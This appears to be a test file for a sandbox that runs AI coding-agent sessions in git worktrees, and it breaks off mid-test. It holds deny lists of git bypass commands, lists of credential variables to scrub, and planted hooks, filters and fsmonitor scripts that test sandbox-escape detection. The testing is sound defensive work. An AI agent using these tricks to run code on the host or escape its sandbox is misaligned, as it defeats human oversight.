import { execFileSync, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, realpathSync, renameSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { CopilotRunManager, STOP_CONTINUATION_SKIP_TOKEN, filterDriverOverrides, hostGit, hostGitHardeningArgs, relativeHooksPathRule, reviewProfileDenial, scrubLaneCredentials, sharedGitStateChanges, sharedGitStateSnapshot, summarizeChanges, } from '../job.js';
import { forgetWorktreeGitLinks, hostGitAttrSourceProblem, hostGitEnv, readWorktreeGitLinks, recordWorktreeGitLinks, recordedWorktreeGitLinks, runHostGit, worktreeGitDirArgs, worktreeGitLinksIntact, } from '../../team/git-worktree.js';
import { copilotRunStartTool, setCopilotRunManagerForTests } from '../../tools/copilot-run-tools.js';
import { SANDBOX_KILL_ENV } from '../sandbox.js';
/** What host status reports for the stat-dirty CRLF file (no eol attribute applies there; trimmed). */
const EOL_STATUS = 'M a.txt';
import { fakeDeps, gitIn, newCalls, scratchRepo } from './fake-sdk.js';
let root;
let repo;
let calls;
const manager = (behavior = 'idle', env = { OMG_COPILOT_RUN_ALLOW: '1' }) => new CopilotRunManager(fakeDeps(root, behavior, calls, env));
const worktreesDir = () => join(repo, '.omg', 'team', 'copilot-run', 'worktrees');
beforeEach(() => {
    calls = newCalls();
    ({ root, repo } = scratchRepo('omg-copilot-run-job-'));
});
afterEach(() => {
    setCopilotRunManagerForTests(null);
    rmSync(root, { recursive: true, force: true });
});
describe('copilot_run startRef', () => {
    it('creates the worktree at a branch and reports its commit as the base', async () => {
        gitIn(repo, 'checkout', '-q', '-b', 'feature');
        writeFileSync(join(repo, 'feature.txt'), 'feature\n');
        gitIn(repo, 'add', 'feature.txt');
        gitIn(repo, 'commit', '-q', '-m', 'feature');
        const featureSha = gitIn(repo, 'rev-parse', 'HEAD');
        gitIn(repo, 'checkout', '-q', 'main');
        writeFileSync(join(repo, 'README.md'), 'dirty leader\n');
        const m = manager();
        const started = m.start({ prompt: 'review', cwd: repo, startRef: 'feature' });
        expect(started.startRef).toBe('feature');
        const done = await m.wait(started.jobId, 10_000);
        const wt = done.worktree;
        expect(done.status).toBe('completed');
        expect(wt.baseCommit).toBe(featureSha);
        expect(gitIn(wt.path, 'rev-parse', 'HEAD')).toBe(featureSha);
        expect(readFileSync(join(wt.path, 'feature.txt'), 'utf8').trim()).toBe('feature');
        // The leader's uncommitted edits are irrelevant to a job that does not start at HEAD.
        expect(done.notes ?? []).not.toEqual(expect.arrayContaining([expect.stringContaining('uncommitted changes')]));
        // Nothing committed beyond startRef: cleanup is allowed although main lacks the feature commit.
        expect(m.cleanup(started.jobId).cleanup).toContain('removed worktree');
    });
    it('accepts a full sha', async () => {
        const sha = gitIn(repo, 'rev-parse', 'HEAD');
        const m = manager();
        const done = await m.wait(m.start({ prompt: 'x', cwd: repo, startRef: sha }).jobId, 10_000);
        expect(done.worktree.baseCommit).toBe(sha);
    });
    it.each([
        ['-b', 'not a valid ref'],
        ['--output=/tmp/x', 'not a valid ref'],
        ['main branch', 'not a valid ref'],
        ['main\nHEAD', 'not a valid ref'],
        ['', 'non-empty string'],
        ['no-such-branch', 'does not resolve to a commit'],
        ['HEAD^{tree}', 'does not resolve to a commit'],
    ])('refuses startRef %j and creates nothing', (ref, message) => {
        const m = manager();
        expect(() => m.start({ prompt: 'x', cwd: repo, startRef: ref })).toThrow(message);
        expect(existsSync(worktreesDir())).toBe(false);
        expect(calls.connections).toHaveLength(0);
    });
    it('refuses startRef with isolation "none"', () => {
        expect(() => manager().start({ prompt: 'x', cwd: repo, isolation: 'none', startRef: 'main' })).toThrow('needs isolation "worktree"');
    });
});
describe('copilot_run events.jsonl', () => {
    it('fails the job, writing nothing, when the name already exists (a planted link where the host allows one)', async () => {
        const victim = join(root, 'victim');
        writeFileSync(victim, 'keep\n');
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        // The log is opened after the first await in the job: plant the name before it.
        const eventsPath = started.eventsPath;
        let planted = 'symlink';
        try {
            symlinkSync(victim, eventsPath, 'file');
        }
        catch {
            writeFileSync(eventsPath, '');
            planted = 'file';
        }
        const done = await m.wait(started.jobId, 10_000);
        expect(done.status, planted).toBe('failed');
        expect(done.error).toContain('events log');
        // The runtime never started: no session exists.
        expect(calls.sessions).toHaveLength(0);
        expect(readFileSync(victim, 'utf8')).toBe('keep\n');
    });
    it('keeps writing the opened file after its name is renamed and replaced', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const eventsPath = started.eventsPath;
        const moved = `${eventsPath}.moved`;
        renameSync(eventsPath, moved);
        writeFileSync(eventsPath, '');
        calls.sessions[0].onEvent({ type: 'assistant.message', data: { content: 'after the swap' } });
        await m.cancel(started.jobId);
        expect(readFileSync(moved, 'utf8')).toContain('after the swap');
        expect(readFileSync(eventsPath, 'utf8')).toBe('');
    });
});
describe('copilot_run review profile', () => {
    it('denies every write and the tree-changing git commands, allows reads and read-only git', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'review', cwd: repo, profile: 'review' });
        expect(started.profile).toBe('review');
        await new Promise((r) => setTimeout(r, 50));
        const decide = calls.sessions[0].onPermissionRequest;
        const wt = started.worktree.path;
        const ctx = { sessionId: 's' };
        expect(await decide({ kind: 'write', path: join(wt, 'README.md') }, ctx)).toMatchObject({ kind: 'reject' });
        expect(await decide({ kind: 'read', path: join(wt, 'README.md') }, ctx)).toEqual({ kind: 'approve-once' });
        for (const cmd of [
            'git commit -am x',
            'git -C . reset --hard HEAD~1',
            'git checkout -b other',
            'git merge main',
            'git rebase main',
            'git stash',
            'npm test && git commit -m x',
            'g=git; $g checkout main',
            'git push origin HEAD',
            // Not on the review allowlist: review lanes do not run PR code.
            'npm test',
        ]) {
            expect(await decide({ kind: 'shell', fullCommandText: cmd }, ctx), cmd).toMatchObject({ kind: 'reject' });
        }
        for (const cmd of ['git status', 'git log --oneline -5', 'git diff main...HEAD', 'git merge-base main HEAD', 'cat README.md']) {
            expect(await decide({ kind: 'shell', fullCommandText: cmd }, ctx), cmd).toEqual({ kind: 'approve-once' });
        }
        await m.cancel(started.jobId);
        expect(m.status(started.jobId).deniedPermissions[0].reason).toContain('review profile');
    });
    it('the write profile (default) still allows commits and worktree writes', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        expect(started.profile).toBe('write');
        await new Promise((r) => setTimeout(r, 50));
        const decide = calls.sessions[0].onPermissionRequest;
        const wt = started.worktree.path;
        expect(await decide({ kind: 'shell', fullCommandText: 'git commit -am x' }, { sessionId: 's' })).toEqual({ kind: 'approve-once' });
        expect(await decide({ kind: 'write', path: join(wt, 'README.md') }, { sessionId: 's' })).toEqual({ kind: 'approve-once' });
        // The file tools reach the job's temp dir, never the engine's events.jsonl nor what the runtime reads back from the home.
        const eventsPath = started.eventsPath;
        expect(await decide({ kind: 'write', path: join(dirname(eventsPath), 'home', 'tmp', 'x') }, { sessionId: 's' })).toEqual({ kind: 'approve-once' });
        expect(await decide({ kind: 'write', path: eventsPath }, { sessionId: 's' })).toMatchObject({ kind: 'reject' });
        expect(await decide({ kind: 'write', fileName: join(dirname(eventsPath), 'home', '..', 'events.jsonl') }, { sessionId: 's' })).toMatchObject({ kind: 'reject' });
        for (const p of ['config.json', join('session-state', 's', 'events.jsonl'), join('.cache', 'copilot', 'pkg', 'runtime.node'), join('git', 'config')]) {
            expect(await decide({ kind: 'write', path: join(dirname(eventsPath), 'home', p) }, { sessionId: 's' }), p).toMatchObject({ kind: 'reject' });
        }
        await m.cancel(started.jobId);
    });
    it('reviewProfileDenial leaves other request kinds to the worker policy', () => {
        expect(reviewProfileDenial({ kind: 'read', path: 'x' })).toBeNull();
        expect(reviewProfileDenial({ kind: 'url', url: 'https://example.com' })).toBeNull();
    });
    it('denies the alias, config and quote-splitting bypasses and the wider subcommand list', () => {
        const denied = (cmd) => reviewProfileDenial({ kind: 'shell', fullCommandText: cmd });
        for (const cmd of [
            // An alias defined on the command line or in the config renames a denied subcommand.
            'git -c alias.c=commit c -am x',
            'git -c "alias.c=commit" c -am x',
            'git -C . -c alias.c=commit c -am x',
            'git -c core.hooksPath=/tmp/h status',
            'git --config-env=alias.c=CMD c -am x',
            'git --config-env alias.c=CMD c',
            'git config alias.c commit',
            'git config --get user.name',
            'g=git; $g -c alias.c=commit c',
            // Empty quotes split a word the shell joins back together.
            "git c''ommit -am x",
            'git c""ommit -am x',
            `git "c"''ommit -am x`,
            "git re''set --hard HEAD~1",
            // A quoted full path to git.
            '& "C:\\Program Files\\Git\\cmd\\git.exe" commit -am x',
            '"C:/Program Files/Git/cmd/git.exe" push origin HEAD',
            // A long global option with a separate value.
            'git --git-dir .git commit -am x',
            'git --work-tree . reset --hard',
            ...['switch main', 'restore README.md', 'cherry-pick abc', 'revert HEAD', 'apply x.patch', 'am x.patch', 'branch -D x',
                'tag v1', 'update-ref refs/heads/x HEAD', 'symbolic-ref HEAD refs/heads/x', 'worktree add ../x', 'notes add -m x',
                'replace HEAD abc', 'push origin HEAD', 'fetch origin main:main', 'fetch origin +refs/heads/*:refs/remotes/o/*',
                'fetch origin :refs/heads/x', 'pull', 'bisect start', 'remote add x y', 'clean -fd', 'sparse-checkout set x', 'submodule update',
                'read-tree HEAD', 'update-index --assume-unchanged x', 'checkout-index -a', 'filter-branch --all', 'gc --prune=now',
                'reflog expire --all'].map((sub) => `git ${sub}`),
        ]) {
            expect(denied(cmd), cmd).toMatch(/^review profile|alias|environment/);
        }
        for (const cmd of [
            'git status', 'git diff main...HEAD', 'git merge-base main HEAD', 'git log -c -1', 'git grep -c TODO',
            'git fetch origin', 'git fetch https://github.com/o/r main', 'git fetch git@github.com:o/r main',
            'git show HEAD:README.md', 'git commit-graph verify',
        ]) {
            expect(denied(cmd), cmd).toBeNull();
        }
    });
    it('rejects an unknown profile', () => {
        expect(() => manager().start({ prompt: 'x', cwd: repo, profile: 'admin' })).toThrow('profile must be');
    });
});
describe('copilot_run allowLive and session env', () => {
    it('refuses without the env var or allowLive', () => {
        expect(() => manager('idle', {}).start({ prompt: 'x', cwd: repo })).toThrow('OMG_COPILOT_RUN_ALLOW=1');
        expect(() => manager('idle', {}).start({ prompt: 'x', cwd: repo }, { allowLive: false })).toThrow('OMG_COPILOT_RUN_ALLOW=1');
        expect(calls.connections).toHaveLength(0);
    });
    it('starts with an in-process allowLive and no env var', async () => {
        const m = manager('idle', {});
        const done = await m.wait(m.start({ prompt: 'x', cwd: repo }, { allowLive: true }).jobId, 10_000);
        expect(done.status).toBe('completed');
    });
    it('the MCP tool cannot pass allowLive', async () => {
        setCopilotRunManagerForTests(manager('idle', {}));
        const result = await copilotRunStartTool.handler({ prompt: 'x', cwd: repo, allowLive: true });
        expect(result.isError).toBe(true);
        expect(calls.connections).toHaveLength(0);
    });
    it('disableStopContinuations skips only the blocking Stop hooks; the allow env and caller OMC_* never reach the session', async () => {
        const m = manager('idle', { OMG_COPILOT_RUN_ALLOW: '1', OMC_SKIP_HOOKS: 'pre-tool-use' });
        await m.wait(m.start({ prompt: 'a', cwd: repo }, { allowLive: true, disableStopContinuations: true }).jobId, 10_000);
        await m.wait(m.start({ prompt: 'b', cwd: repo }).jobId, 10_000);
        const [lane, plain] = calls.connections.map((c) => c.env);
        expect(STOP_CONTINUATION_SKIP_TOKEN).toBe('persistent-mode,workflow-drift-guard,code-simplifier');
        expect(lane.OMC_SKIP_HOOKS).toBe(STOP_CONTINUATION_SKIP_TOKEN);
        expect(lane.OMG_COPILOT_RUN_ALLOW).toBeUndefined();
        expect(lane.OMC_GIT_GUARDRAILS).toBe('1');
        expect(plain.OMC_SKIP_HOOKS).toBeUndefined();
        expect(plain.OMG_COPILOT_RUN_ALLOW).toBeUndefined();
    });
    it('scrubCredentials: no GitHub tokens or other secrets, an empty gh config, no git credential helper; COPILOT_GITHUB_TOKEN still reaches the session', async () => {
        const secrets = {
            GH_TOKEN: 'ghp_x', GITHUB_TOKEN: 'ghs_x', GH_ENTERPRISE_TOKEN: 'e', GITHUB_ENTERPRISE_TOKEN: 'e', NPM_TOKEN: 'n', AWS_SECRET_ACCESS_KEY: 'a',
            SSH_AUTH_SOCK: '/tmp/agent', GIT_ASKPASS: 'askpass', GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'credential.helper', GIT_CONFIG_VALUE_0: 'store', MY_API_KEY: 'k',
            AZURE_DEVOPS_EXT_PAT: 'x', azure_client_certificate_path: '/home/me/sp.pem', OMC_ADO_PAT: 'x',
        };
        const m = manager('idle', { OMG_COPILOT_RUN_ALLOW: '1', COPILOT_GITHUB_TOKEN: 'copilot-only', GH_CONFIG_DIR: '/home/me/.config/gh', ...secrets });
        await m.wait(m.start({ prompt: 'a', cwd: repo }, { allowLive: true, scrubCredentials: true }).jobId, 10_000);
        await m.wait(m.start({ prompt: 'b', cwd: repo }, { allowLive: true }).jobId, 10_000);
        const [lane, plain] = calls.connections.map((c) => c.env);
        for (const key of Object.keys(secrets))
            expect(lane[key], key).toBeUndefined();
        // The Copilot credential goes over the session RPC, never into the env the shell inherits.
        expect(lane.COPILOT_GITHUB_TOKEN).toBeUndefined();
        expect(calls.sessions[0].gitHubToken).toBe('copilot-only');
        expect(lane.GH_CONFIG_DIR).not.toBe('/home/me/.config/gh');
        expect(lane.AZURE_CONFIG_DIR).toBe(lane.GH_CONFIG_DIR);
        expect(lane).toMatchObject({ GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0' });
        // The empty gh config dir is removed with the session.
        expect(existsSync(lane.GH_CONFIG_DIR)).toBe(false);
        // Every session's env is allowlisted (sandbox.ts allowlistSessionEnv): no secret reaches an unscrubbed one either.
        expect(plain.NPM_TOKEN).toBeUndefined();
        expect(plain.GH_CONFIG_DIR).toBeUndefined();
        // The scrubbed lane keeps the relocated, identity-only global config, so it can still commit.
        expect(lane.GIT_CONFIG_GLOBAL).toMatch(/[\\/]git[\\/]config$/);
        // No session's git reaches a credential helper (Git for Windows' system config sets manager) or prompts.
        for (const [i, env] of [lane, plain].entries()) {
            const globalConfig = join(root, `global-gitconfig-${i}`);
            writeFileSync(globalConfig, calls.globalGitConfigs[i] ?? '');
            const helpers = execFileSync('git', ['config', '--get-all', 'credential.helper'], { cwd: repo, env: { ...env, GIT_CONFIG_GLOBAL: globalConfig }, encoding: 'utf8' });
            expect(helpers.split(/\r?\n/).slice(0, -1).at(-1)).toBe('');
            expect(env).toMatchObject({ GCM_INTERACTIVE: 'never', GIT_TERMINAL_PROMPT: '0' });
        }
    });
    it('scrubLaneCredentials removes every Azure DevOps and Azure credential in any letter case and points az at the empty dir', () => {
        const azure = [
            'AZURE_DEVOPS_EXT_PAT', 'AZURE_DEVOPS_EXT_AZURE_RM_SERVICE_PRINCIPAL_KEY', 'AZURE_DEVOPS_EXT_GITHUB_PAT', 'SYSTEM_ACCESSTOKEN',
            'AZURE_CLIENT_SECRET', 'AZURE_CLIENT_CERTIFICATE_PATH', 'AZURE_FEDERATED_TOKEN_FILE', 'ARM_CLIENT_SECRET',
            'AZURE_CLIENT_CERTIFICATE_PASSWORD', 'AZURE_PASSWORD', 'IDENTITY_ENDPOINT', 'IDENTITY_HEADER', 'MSI_ENDPOINT', 'MSI_SECRET',
            'AZURE_STORAGE_KEY', 'AZURE_STORAGE_CONNECTION_STRING', 'AZURE_STORAGE_SAS_TOKEN', 'ARM_CLIENT_CERTIFICATE_PATH',
            'ARM_CLIENT_CERTIFICATE_PASSWORD', 'ARM_OIDC_TOKEN', 'ARM_OIDC_TOKEN_FILE_PATH', 'ARM_OIDC_REQUEST_TOKEN', 'ARM_ACCESS_KEY', 'ARM_SAS_TOKEN',
            // Caught by the name pattern alone (_PAT, PRINCIPAL_KEY).
            'OMC_ADO_PAT', 'MY_SERVICE_PRINCIPAL_KEY', 'ADO_PAT_VALUE', 'AZURE_DEVOPS_EXT_SERVICEPRINCIPALKEY',
            'VSS_NUGET_EXTERNAL_FEED_ENDPOINTS', 'ARM_CLIENT_CERTIFICATE',
        ];
        // Windows env keys are case-insensitive: a lower- or mixed-case key is the same variable.
        const mixed = (n) => [...n].map((c, i) => (i % 2 ? c.toLowerCase() : c)).join('');
        for (const variant of [(n) => n, (n) => n.toLowerCase(), mixed]) {
            const emptyDir = join(root, `nocreds-${variant('AB')}`);
            mkdirSync(emptyDir, { recursive: true });
            const env = { PATH: '/bin', AZURE_CONFIG_DIR: '/home/me/.azure', AZURE_DEVOPS_EXT_PAT: 'x' };
            for (const name of azure)
                env[variant(name)] = 'x';
            scrubLaneCredentials(env, emptyDir);
            for (const name of azure)
                expect(env[variant(name)], variant(name)).toBeUndefined();
            expect(Object.keys(env).filter((k) => azure.includes(k.toUpperCase()))).toEqual([]);
            expect(env.AZURE_CONFIG_DIR).toBe(emptyDir);
            expect(env.PATH).toBe('/bin');
        }
    });
    it('scrubCredentials without a stored login or COPILOT_GITHUB_TOKEN fails instead of starting an unauthenticated session', async () => {
        rmSync(join(root, 'user-copilot', 'config.json'));
        const m = manager('idle', { OMG_COPILOT_RUN_ALLOW: '1', GH_TOKEN: 'ghp_x' });
        const done = await m.wait(m.start({ prompt: 'a', cwd: repo }, { allowLive: true, scrubCredentials: true }).jobId, 10_000);
        expect(done.status).toBe('failed');
        expect(String(done.error)).toMatch(/needs a stored Copilot login .* or COPILOT_GITHUB_TOKEN/);
        expect(calls.connections).toHaveLength(0);
    });
});
describe('copilot_run lane skip token in the Stop hook scripts', () => {
    /** Run a Stop hook script in `repo` with a clean OMC env plus `env`; returns its parsed JSON output. */
    function runStopHook(script, input, env) {
        const base = { ...process.env };
        for (const key of ['DISABLE_OMC', 'OMC_SKIP_HOOKS', 'OMC_HOME', 'OMC_STATE_DIR', 'XDG_CONFIG_HOME', 'CLAUDE_PLUGIN_ROOT', 'OMC_JEV'])
            delete base[key];
        const stdout = execFileSync(process.execPath, [join(process.cwd(), 'scripts', script)], {
            input: JSON.stringify({ hook_event_name: 'Stop', session_id: 'lane-skip-test', cwd: repo, ...input }),
            encoding: 'utf-8',
            timeout: 15_000,
            env: { ...base, ...env },
        });
        return JSON.parse(stdout.trim());
    }
    it('workflow-drift-guard and code-simplifier block without it and let the lane stop with it', () => {
        // A review verdict that quotes a PR's TODO while the tree holds one.
        writeFileSync(join(repo, 'index.ts'), 'export function next() {\n  // TODO: implement follow-up\n  return 1;\n}\n');
        gitIn(repo, 'add', 'index.ts');
        writeFileSync(join(repo, 'index.ts'), 'export function next() {\n  // TODO: implement follow-up\n  return 2;\n}\n');
        const home = join(root, 'home');
        mkdirSync(join(home, '.omg'), { recursive: true });
        writeFileSync(join(home, '.omg', 'config.json'), JSON.stringify({ codeSimplifier: { enabled: true } }));
        const verdict = { last_assistant_message: 'Review complete. Verdict: approve; the TODO in index.ts is fine.' };
        const homeEnv = { HOME: home, USERPROFILE: home };
        expect(runStopHook('workflow-drift-guard.mjs', verdict, homeEnv).decision).toBe('block');
        expect(runStopHook('code-simplifier.mjs', {}, homeEnv).decision).toBe('block');
        rmSync(join(repo, '.omg', 'state', 'code-simplifier-triggered.marker'), { force: true });
        const lane = { ...homeEnv, OMC_SKIP_HOOKS: STOP_CONTINUATION_SKIP_TOKEN };
        expect(runStopHook('workflow-drift-guard.mjs', verdict, lane).decision).toBeUndefined();
        expect(runStopHook('code-simplifier.mjs', {}, lane)).toEqual({ continue: true });
    });
});
describe('copilot_run change summary', () => {
    it('runs no clean filter the job planted (required, or under a dotted name), but still sees the change', () => {
        const base = gitIn(repo, 'rev-parse', 'HEAD');
        const marker = join(root, 'pwned').replace(/\\/g, '/');
        gitIn(repo, 'config', 'filter.evil.clean', `touch "${marker}"; cat`);
        gitIn(repo, 'config', 'filter.evil.required', 'true');
        gitIn(repo, 'config', 'filter.other.name.with.dots.clean', `touch "${marker}"; cat`);
        writeFileSync(join(repo, '.gitattributes'), 'README.md filter=evil\n*.txt filter=other.name.with.dots\n');
        writeFileSync(join(repo, 'README.md'), 'changed by the job\n');
        writeFileSync(join(repo, 'notes.txt'), 'x\n');
        gitIn(repo, 'add', '-N', 'notes.txt');
        // Control: a plain diff runs the planted driver.
        gitIn(repo, 'diff', '--no-ext-diff', '--no-textconv', '--stat', base, '--');
        expect(existsSync(marker)).toBe(true);
        rmSync(marker);
        const summary = summarizeChanges(repo, base);
        expect(existsSync(marker)).toBe(false);
        expect(summary?.changedFiles).toEqual(expect.arrayContaining(['README.md', 'notes.txt']));
    });
    it('host-side git runs no hook, fsmonitor or external diff a write lane planted', () => {
        const base = gitIn(repo, 'rev-parse', 'HEAD');
        const marker = join(root, 'planted').replace(/\\/g, '/');
        const script = join(root, 'planted.sh');
        writeFileSync(script, `#!/bin/sh\necho "$0" >> "${marker}"\nexit 1\n`, { mode: 0o755 });
        const hooks = join(repo, '.git', 'hooks');
        mkdirSync(hooks, { recursive: true });
        writeFileSync(join(hooks, 'post-checkout'), `#!/bin/sh\necho hook >> "${marker}"\n`, { mode: 0o755 });
        gitIn(repo, 'config', 'core.fsmonitor', script.replace(/\\/g, '/'));
        gitIn(repo, 'config', 'diff.external', script.replace(/\\/g, '/'));
        gitIn(repo, 'config', 'core.pager', `sh "${script.replace(/\\/g, '/')}"`);
        writeFileSync(join(repo, 'README.md'), 'changed by the lane\n');
        // Control: plain git runs the planted fsmonitor and hook.
        gitIn(repo, 'status', '--porcelain');
        gitIn(repo, 'checkout', '-q', '-b', 'control');
        expect(existsSync(marker)).toBe(true);
        rmSync(marker);
        expect(summarizeChanges(repo, base)?.changedFiles).toContain('README.md');
        expect(hostGit(repo, ['checkout', '-q', '-b', 'hardened'])).toBe('');
        expect(hostGit(repo, ['status', '--porcelain'])).toContain('README.md');
        expect(hostGitHardeningArgs()).toEqual(expect.arrayContaining([
            'core.fsmonitor=false', 'core.pager=cat', 'diff.external=', 'core.sshCommand=ssh', 'credential.helper=',
            'gpg.program=gpg', 'core.editor=:', 'sequence.editor=:',
        ]));
        expect(existsSync(marker)).toBe(false);
    });
    it('lists every filter driver name and fails closed on one that cannot be overridden', () => {
        gitIn(repo, 'config', 'filter.a.clean', 'x');
        gitIn(repo, 'config', 'filter.b.c.smudge', 'y');
        // A system-scope driver is blanked too (Git for Windows ships filter.lfs there).
        const system = join(root, 'system-gitconfig');
        writeFileSync(system, '[filter "lfs"]\n\tprocess = git-lfs filter-process\n');
        const saved = process.env.GIT_CONFIG_SYSTEM;
        process.env.GIT_CONFIG_SYSTEM = system;
        try {
            expect(filterDriverOverrides(repo)).toEqual([
                '-c', 'filter.lfs.clean=', '-c', 'filter.lfs.smudge=', '-c', 'filter.lfs.process=', '-c', 'filter.lfs.required=false',
                '-c', 'filter.a.clean=', '-c', 'filter.a.smudge=', '-c', 'filter.a.process=', '-c', 'filter.a.required=false',
                '-c', 'filter.b.c.clean=', '-c', 'filter.b.c.smudge=', '-c', 'filter.b.c.process=', '-c', 'filter.b.c.required=false',
            ]);
        }
        finally {
            if (saved === undefined)
                delete process.env.GIT_CONFIG_SYSTEM;
            else
                process.env.GIT_CONFIG_SYSTEM = saved;
        }
        gitIn(repo, 'config', 'filter.x=y.clean', 'z');
        expect(filterDriverOverrides(repo)).toBeNull();
        expect(summarizeChanges(repo, gitIn(repo, 'rev-parse', 'HEAD'))).toBeNull();
    });
});
describe('copilot_run worktree git links (a lane redirecting host git)', () => {
    const marker = () => join(root, 'evil-ran');
    /** A git dir the lane controls: a hooksPath full of hooks and an fsmonitor, each appending to the marker. */
    function evilGitDir() {
        const evil = join(root, 'evil');
        gitIn(root, 'init', '-q', evil);
        const script = join(root, 'evil.sh');
        writeFileSync(script, `#!/bin/sh\necho fsmonitor >> "${marker().replace(/\\/g, '/')}"\nexit 1\n`, { mode: 0o755 });
        const hooks = join(root, 'evil-hooks');
        mkdirSync(hooks, { recursive: true });
        for (const hook of ['post-checkout', 'post-index-change', 'reference-transaction', 'pre-auto-gc']) {
            writeFileSync(join(hooks, hook), `#!/bin/sh\necho ${hook} >> "${marker().replace(/\\/g, '/')}"\n`, { mode: 0o755 });
        }
        gitIn(evil, 'config', 'core.hooksPath', hooks.replace(/\\/g, '/'));
        gitIn(evil, 'config', 'core.fsmonitor', script.replace(/\\/g, '/'));
        return join(evil, '.git').replace(/\\/g, '/');
    }
    const adminDirOf = (wt) => readFileSync(join(wt, '.git'), 'utf8').replace(/^gitdir: /, '').trim();
    /** Control: plain git in the tampered worktree runs the lane's code. */
    function expectPlainGitRunsIt(wt) {
        try {
            execFileSync('git', ['status', '--porcelain'], { cwd: wt, stdio: 'pipe' });
        }
        catch { /* the marker is what counts */ }
        expect(existsSync(marker())).toBe(true);
        rmSync(marker());
    }
    async function finishedJob(m) {
        const started = m.start({ prompt: 'implement', cwd: repo });
        const done = await m.wait(started.jobId, 10_000);
        expect(done.status).toBe('completed');
        const { path, branch } = done.worktree;
        return { id: started.jobId, wt: path, branch };
    }
    function expectRemovedByPath(m, job, admin) {
        const res = m.cleanup(job.id);
        expect(res.cleanup).toMatch(/^sandbox-escaped: .*no git ran in it/);
        expect(existsSync(marker())).toBe(false);
        expect(existsSync(job.wt)).toBe(false);
        expect(existsSync(admin)).toBe(false);
        // The branch is kept for inspection; the repository itself is unharmed.
        expect(gitIn(repo, 'rev-parse', '--verify', `refs/heads/${job.branch}`)).toMatch(/^[0-9a-f]{40}$/);
        expect(gitIn(repo, 'worktree', 'list', '--porcelain')).not.toContain(job.id);
    }
    it('cleanup runs no hook or fsmonitor of a git dir the worktree\'s commondir was redirected to, and removes it by path', async () => {
        const m = manager();
        const job = await finishedJob(m);
        const admin = adminDirOf(job.wt);
        writeFileSync(join(admin, 'commondir'), `${evilGitDir()}\n`);
        expectPlainGitRunsIt(job.wt);
        expectRemovedByPath(m, job, admin);
    });
    it('cleanup runs no hook or fsmonitor of a git dir a rewritten .git file points at, and removes it by path', async () => {
        const m = manager();
        const job = await finishedJob(m);
        const admin = adminDirOf(job.wt);
        // Replaced, not rewritten in place: git marks the file hidden on Windows.
        rmSync(join(job.wt, '.git'));
        writeFileSync(join(job.wt, '.git'), `gitdir: ${evilGitDir()}\n`);
        expectPlainGitRunsIt(job.wt);
        expectRemovedByPath(m, job, admin);
    });
    it('links redirected during the session fail the job as sandbox-escaped with no host git in the worktree', async () => {
        const m = manager('hang');
        const started = m.start({ prompt: 'implement', cwd: repo });
        await new Promise((r) => setTimeout(r, 50));
        const wt = started.worktree.path;
        const admin = adminDirOf(wt);
        writeFileSync(join(admin, 'commondir'), `${evilGitDir()}\n`);
        const done = await m.cancel(started.jobId);
        expect(done.status).toBe('failed');
        expect(done.error).toMatch(/^sandbox-escaped: the job worktree's git links/);
        expect(done.changes ?? null).toBeNull();
        expect(existsSync(marker())).toBe(false);
        expect(m.cleanup(started.jobId).cleanup).toMatch(/^sandbox-escaped: /);
        expect(existsSync(marker())).toBe(false);
    });
    it('a commondir flipped after the link check is never read: host git re-checks the links per call and pins the recorded git dirs', async () => {
        const m = manager();
        const job = await finishedJob(m);
        const links = readWorktreeGitLinks(job.wt);
        const args = worktreeGitDirArgs(job.wt);
        expect(worktreeGitLinksIntact(job.wt, links, join(repo, '.git'))).toBe(true);
        // A surviving lane child flips the link between the check and the git call.
        const evil = evilGitDir();
        gitIn(root, '--git-dir', evil, 'config', 'omg.flipped', 'yes');
        writeFileSync(join(links.adminDir, 'commondir'), `${evil}\n`);
        // Control: git with only --git-dir follows the flipped link.
        expect(execFileSync('git', [...args, 'config', '--get', 'omg.flipped'], { cwd: job.wt, encoding: 'utf8', stdio: 'pipe' }).trim()).toBe('yes');
        rmSync(marker(), { force: true });
        expect(() => runHostGit(job.wt, [...args, 'config', '--get', 'omg.flipped'])).toThrow(/^sandbox-escaped: /);
        expect(hostGit(job.wt, [...args, 'status', '--porcelain'])).toBeNull();
        // The pinned environment alone (past the per-call check) still names the recorded common dir.
        const pinned = execFileSync('git', [...args, 'rev-parse', '--path-format=absolute', '--git-common-dir'], { cwd: job.wt, env: hostGitEnv(args), encoding: 'utf8', stdio: 'pipe' });
        expect(pinned.trim().toLowerCase()).toBe(join(repo, '.git').replace(/\\/g, '/').toLowerCase());
        expect(existsSync(marker())).toBe(false);
    });
    /** A filter script that appends to the marker and passes the bytes through. */
    function markerFilter() {
        const script = join(root, 'filter.sh');
        writeFileSync(script, `#!/bin/sh\necho filter >> "${marker().replace(/\\/g, '/')}"\ncat\n`, { mode: 0o755 });
        return script.replace(/\\/g, '/');
    }
    let tick = 0;
    /** Same bytes, new mtime: git must hash the file again, through the clean filter. */
    const stale = (wt, file = 'README.md') => { const t = new Date(Date.UTC(2001, 0, 1 + ++tick)); utimesSync(join(wt, file), t, t); };
    /** Replace the creation record with the links on disk now (a test-only shortcut past the record-once rule). */
    function rerecordLinks(wt) {
        const links = readWorktreeGitLinks(wt);
        forgetWorktreeGitLinks(wt);
        recordWorktreeGitLinks(wt, links);
        return links;
    }
    /** A filter planted in the admin dir's config.worktree, with its attributes outside the worktree (core.attributesFile). */
    function plantConfigWorktreeFilter(adminDir) {
        const attrs = join(root, 'lane-attributes');
        writeFileSync(attrs, '* filter=x\n');
        writeFileSync(join(adminDir, 'config.worktree'), `[filter "x"]\n\tclean = sh "${markerFilter()}"\n[core]\n\tattributesFile = ${attrs.replace(/\\/g, '/')}\n`);
    }
    it('a config.worktree written after creation (extensions.worktreeConfig) stops every host git call; cleanup removes it by path', async () => {
        gitIn(repo, 'config', 'extensions.worktreeConfig', 'true');
        const m = manager();
        const job = await finishedJob(m);
